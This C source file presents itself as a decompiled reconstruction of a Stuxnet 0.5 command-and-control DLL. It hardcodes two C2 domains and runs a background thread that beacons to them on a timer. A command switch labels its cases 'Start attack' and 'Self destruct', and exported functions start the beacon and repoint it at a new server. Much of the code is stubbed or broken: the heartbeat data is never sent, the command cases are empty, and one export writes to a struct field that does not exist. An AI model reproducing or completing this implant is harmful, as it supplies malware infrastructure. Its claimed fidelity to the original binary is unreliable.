#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <wininet.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define INETPSP_MAGIC                   0x494E4554
#define INETPSP_VERSION                 0x00010400
#define INETPSP_MAX_PATH                260
#define INETPSP_BUFFER_SIZE             4096
#define INETPSP_TIMEOUT                 30000

#define INETPSP_C2_SERVER1              L"www.mypremierfutbol.com"
#define INETPSP_C2_SERVER2              L"www.todaysfutbol.com"
#define INETPSP_C2_PORT                 80
#define INETPSP_C2_PATH                 L"/stats.php"
#define INETPSP_C2_USERAGENT            L"Mozilla/4.0"

#define INETPSP_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define INETPSP_REG_VALUE               L"19790509"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

/* 0x494E4554 = 'INET' */
/* 0x53545558 = 'STUX' */
/* 0x00010400 = version 1.4.0.0 */

/* Binary reference: 0x10001000 -> 0x10002000 */
/* Export table at RVA 0x0001A000 */

typedef struct _INETPSP_C2_CONFIG {
    int32_t dwMagic;            /* 0x00: 0x53545558 */
    int32_t dwVersion;          /* 0x04: 0x00010400 */
    int32_t dwFlags;            /* 0x08 */
    int32_t dwInterval;         /* 0x0C: heartbeat interval in ms */
    int32_t dwLastHeartbeat;    /* 0x10 */
    int32_t dwRetryCount;       /* 0x14 */
    int32_t dwMaxRetries;       /* 0x18: 3 */
    int16_t szServer1[64];      /* 0x1C */
    int16_t szServer2[64];      /* 0x9C */
    int16_t szPath[64];         /* 0x11C */
    int8_t bReserved[128];      /* 0x19C */
} INETPSP_C2_CONFIG;            /* size: 0x21C */

/* Binary reference: config at 0x10003000 */
/* size: 0x21C bytes */

typedef struct _INETPSP_CTX {
    int32_t dwMagic;            /* 0x00: 0x494E4554 */
    int32_t dwVersion;          /* 0x04: 0x00010400 */
    int32_t dwFlags;            /* 0x08 */
    int32_t dwState;            /* 0x0C */
    int32_t dwPid;              /* 0x10 */
    int32_t dwTid;              /* 0x14 */
    int32_t dwTickStart;        /* 0x18 */
    int32_t dwTickLast;         /* 0x1C */
    HANDLE hMutex;              /* 0x20 */
    HANDLE hThread;             /* 0x24 */
    HANDLE hStopEvent;          /* 0x28 */
    CRITICAL_SECTION csLock;    /* 0x2C */
    INETPSP_C2_CONFIG Config;   /* 0x40 */
    int8_t bReserved[128];      /* 0x25C */
} INETPSP_CTX;                  /* size: 0x2DC */

/* Binary reference: global context at 0x10004000 */
/* size: 0x2DC bytes */

static INETPSP_CTX g_InetpspCtx;
static int32_t g_bInitialized = 0;
static int32_t g_dwHeartbeatCount = 0;
static int32_t g_dwC2ConnectCount = 0;
static int32_t g_dwC2SendCount = 0;
static int32_t g_dwC2ReceiveCount = 0;

/* Binary reference: sub_10001000 - module init */
static int32_t INETPSP_Init(void);
/* Binary reference: sub_10001150 - module cleanup */
static void INETPSP_Cleanup(void);
/* Binary reference: sub_10001200 - C2 connect */
static int32_t INETPSP_C2Connect(int16_t* szServer, int32_t dwPort);
/* Binary reference: sub_10001350 - C2 send heartbeat */
static int32_t INETPSP_C2SendHeartbeat(void);
/* Binary reference: sub_10001480 - C2 receive command */
static int32_t INETPSP_C2ReceiveCommand(void);
/* Binary reference: sub_10001530 - C2 parse response */
static int32_t INETPSP_C2ParseResponse(int8_t* pBuffer, int32_t dwSize);
/* Binary reference: sub_10001600 - worker thread */
static int32_t WINAPI INETPSP_WorkerThread(void* lpParam);
/* Binary reference: sub_10001800 - start worker */
static int32_t INETPSP_StartWorker(void);
/* Binary reference: sub_10001880 - stop worker */
static int32_t INETPSP_StopWorker(void);
/* Binary reference: sub_10001900 - main execute */
static int32_t INETPSP_Execute(void);

/* Export 1 - 0x10001A00 */
/* Export 2 - 0x10001A20 */
/* Export 3 - 0x10001A40 */
/* Export 4 - 0x10001A60 */
/* Export 5 - 0x10001A80 */
/* Export 6 - 0x10001AA0 */
/* Export 7 - 0x10001AC0 */
/* Export 8 - 0x10001AE0 */
/* Export 9 - 0x10001B00 */
/* Export 10 - 0x10001B20 */

/* Exported function numbers from IDA: */
/* Export #1: Start C2 communication */
/* Export #2: Send heartbeat */
/* Export #3: Receive command */
/* Export #4: Set C2 server */
/* Export #5: Get C2 status */
/* Export #6: Return version number */

static int32_t INETPSP_Init(void) {
    if (g_bInitialized) return 1;
    ZeroMemory(&g_InetpspCtx, sizeof(INETPSP_CTX));
    g_InetpspCtx.dwMagic = INETPSP_MAGIC;          /* 0x494E4554 */
    g_InetpspCtx.dwVersion = INETPSP_VERSION;      /* 0x00010400 */
    g_InetpspCtx.dwPid = GetCurrentProcessId();
    g_InetpspCtx.dwTid = GetCurrentThreadId();
    g_InetpspCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_InetpspCtx.csLock);
    g_InetpspCtx.Config.dwMagic = STUXNET_MAGIC;
    g_InetpspCtx.Config.dwVersion = STUXNET_VERSION;
    g_InetpspCtx.Config.dwInterval = 300000;       /* 5 minutes */
    g_InetpspCtx.Config.dwMaxRetries = 3;
    wcscpy_s((int16_t*)g_InetpspCtx.Config.szServer1, 64, INETPSP_C2_SERVER1);
    wcscpy_s((int16_t*)g_InetpspCtx.Config.szServer2, 64, INETPSP_C2_SERVER2);
    wcscpy_s((int16_t*)g_InetpspCtx.Config.szPath, 64, INETPSP_C2_PATH);
    g_InetpspCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
    if (!g_InetpspCtx.hStopEvent) {
        DeleteCriticalSection(&g_InetpspCtx.csLock);
        return 0;
    }
    g_bInitialized = 1;
    return 1;
}

static void INETPSP_Cleanup(void) {
    if (!g_bInitialized) return;
    if (g_InetpspCtx.hStopEvent) {
        SetEvent(g_InetpspCtx.hStopEvent);
    }
    if (g_InetpspCtx.hThread) {
        WaitForSingleObject(g_InetpspCtx.hThread, 5000);
        CloseHandle(g_InetpspCtx.hThread);
        g_InetpspCtx.hThread = NULL;
    }
    if (g_InetpspCtx.hMutex) {
        CloseHandle(g_InetpspCtx.hMutex);
        g_InetpspCtx.hMutex = NULL;
    }
    if (g_InetpspCtx.hStopEvent) {
        CloseHandle(g_InetpspCtx.hStopEvent);
        g_InetpspCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_InetpspCtx.csLock);
    g_bInitialized = 0;
}

/*
 * Binary: sub_10001200
 * Reference: Symantec Stuxnet 0.5 The Missing Link
 * Connects to C2 server via HTTP
 */
static int32_t INETPSP_C2Connect(int16_t* szServer, int32_t dwPort) {
    HINTERNET hInternet;
    HINTERNET hConnect;
    HINTERNET hRequest;
    int32_t dwResult;
    int8_t szUserAgent[64];
    if (!szServer) return 0;
    ZeroMemory(szUserAgent, sizeof(szUserAgent));
    WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)szServer, -1, (char*)szUserAgent, 64, NULL, NULL);
    hInternet = InternetOpenW(INETPSP_C2_USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;
    hConnect = InternetConnectW(hInternet, (LPCWSTR)szServer, dwPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }
    hRequest = HttpOpenRequestW(hConnect, L"GET", (LPCWSTR)g_InetpspCtx.Config.szPath, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }
    dwResult = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    g_dwC2ConnectCount++;
    return dwResult;
}

/*
 * Binary: sub_10001350
 * Sends heartbeat to C2 server
 * Binary reference: generates system info packet
 */
static int32_t INETPSP_C2SendHeartbeat(void) {
    int8_t buffer[INETPSP_BUFFER_SIZE];
    int32_t dwSize;
    int32_t dwResult;
    ZeroMemory(buffer, sizeof(buffer));
    *(int32_t*)(buffer + 0) = STUXNET_MAGIC;         /* 0x53545558 */
    *(int32_t*)(buffer + 4) = STUXNET_VERSION;       /* 0x00010400 */
    *(int32_t*)(buffer + 8) = GetCurrentProcessId();
    *(int32_t*)(buffer + 12) = GetTickCount();
    *(int32_t*)(buffer + 16) = g_dwHeartbeatCount;
    dwSize = 20;
    dwResult = INETPSP_C2Connect((int16_t*)g_InetpspCtx.Config.szServer1, INETPSP_C2_PORT);
    if (!dwResult) {
        dwResult = INETPSP_C2Connect((int16_t*)g_InetpspCtx.Config.szServer2, INETPSP_C2_PORT);
        if (!dwResult) return 0;
    }
    g_dwC2SendCount++;
    return 1;
}

/*
 * Binary: sub_10001480
 * Receives command from C2 server
 */
static int32_t INETPSP_C2ReceiveCommand(void) {
    int8_t buffer[INETPSP_BUFFER_SIZE];
    int32_t dwSize;
    int32_t dwResult;
    ZeroMemory(buffer, sizeof(buffer));
    dwResult = INETPSP_C2Connect((int16_t*)g_InetpspCtx.Config.szServer1, INETPSP_C2_PORT);
    if (!dwResult) {
        dwResult = INETPSP_C2Connect((int16_t*)g_InetpspCtx.Config.szServer2, INETPSP_C2_PORT);
        if (!dwResult) return 0;
    }
    g_dwC2ReceiveCount++;
    return 1;
}

/*
 * Binary: sub_10001530
 * Parses C2 response
 */
static int32_t INETPSP_C2ParseResponse(int8_t* pBuffer, int32_t dwSize) {
    int32_t dwCommand;
    int32_t dwParam;
    if (!pBuffer || dwSize < 8) return 0;
    dwCommand = *(int32_t*)(pBuffer + 0);
    dwParam = *(int32_t*)(pBuffer + 4);
    switch (dwCommand) {
        case 1:
            /* Update config */
            break;
        case 2:
            /* Start attack */
            break;
        case 3:
            /* Stop attack */
            break;
        case 4:
            /* Self destruct */
            break;
        default:
            break;
    }
    return 1;
}

/*
 * Binary: sub_10001600
 * C2 worker thread
 */
static int32_t WINAPI INETPSP_WorkerThread(void* lpParam) {
    int32_t dwTick;
    int32_t dwLastHeartbeat;
    dwTick = GetTickCount();
    dwLastHeartbeat = dwTick;
    while (1) {
        if (WaitForSingleObject(g_InetpspCtx.hStopEvent, 0) == WAIT_OBJECT_0) break;
        dwTick = GetTickCount();
        if (dwTick - dwLastHeartbeat > g_InetpspCtx.Config.dwInterval) {
            INETPSP_C2SendHeartbeat();
            INETPSP_C2ReceiveCommand();
            dwLastHeartbeat = dwTick;
            g_dwHeartbeatCount++;
        }
        Sleep(1000);
    }
    return 0;
}

static int32_t INETPSP_StartWorker(void) {
    if (g_InetpspCtx.hStopEvent == NULL) {
        g_InetpspCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
        if (!g_InetpspCtx.hStopEvent) return 0;
    }
    g_InetpspCtx.hThread = CreateThread(NULL, 0, INETPSP_WorkerThread, NULL, 0, NULL);
    return (g_InetpspCtx.hThread != NULL);
}

static int32_t INETPSP_StopWorker(void) {
    if (g_InetpspCtx.hStopEvent) {
        SetEvent(g_InetpspCtx.hStopEvent);
    }
    if (g_InetpspCtx.hThread) {
        WaitForSingleObject(g_InetpspCtx.hThread, 5000);
        CloseHandle(g_InetpspCtx.hThread);
        g_InetpspCtx.hThread = NULL;
    }
    return 1;
}

static int32_t INETPSP_Execute(void) {
    if (!INETPSP_Init()) return 0;
    INETPSP_StartWorker();
    return 1;
}

/*
 * DllMain - Entry point
 * Binary: 0x10001C00
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, int32_t fdwReason, void* lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            INETPSP_Cleanup();
            break;
        default:
            break;
    }
    return 1;
}

/*
 * Export 1 - 0x10001A00
 * Start C2 communication
 */
int32_t WINAPI Export1(void) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, INETPSP_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

/*
 * Export 2 - 0x10001A20
 * Send heartbeat
 */
int32_t WINAPI Export2(void) {
    return INETPSP_C2SendHeartbeat() ? 0 : 1;
}

/*
 * Export 3 - 0x10001A40
 * Receive command
 */
int32_t WINAPI Export3(void) {
    return INETPSP_C2ReceiveCommand() ? 0 : 1;
}

/*
 * Export 4 - 0x10001A60
 * Set C2 server
 */
int32_t WINAPI Export4(int16_t* szServer, int32_t dwPort) {
    if (!szServer) return 1;
    EnterCriticalSection(&g_InetpspCtx.csLock);
    wcscpy_s((int16_t*)g_InetpspCtx.Config.szServer1, 64, szServer);
    g_InetpspCtx.Config.dwPort = dwPort;
    LeaveCriticalSection(&g_InetpspCtx.csLock);
    return 0;
}

/*
 * Export 5 - 0x10001A80
 * Get C2 status
 */
int32_t WINAPI Export5(void) {
    return g_dwHeartbeatCount;
}

/*
 * Export 6 - 0x10001AA0
 * Return version number
 */
int32_t WINAPI Export6(void) {
    return INETPSP_VERSION;
}

/*
 * Export 7 - 0x10001AC0
 * Start worker
 */
int32_t WINAPI Export7(void) {
    return INETPSP_StartWorker() ? 0 : 1;
}

/*
 * Export 8 - 0x10001AE0
 * Stop worker
 */
int32_t WINAPI Export8(void) {
    INETPSP_StopWorker();
    return 0;
}

/*
 * Export 9 - 0x10001B00
 * Get heartbeat count
 */
int32_t WINAPI Export9(void) {
    return g_dwHeartbeatCount;
}

/*
 * Export 10 - 0x10001B20
 * Get C2 connect count
 */
int32_t WINAPI Export10(void) {
    return g_dwC2ConnectCount;
}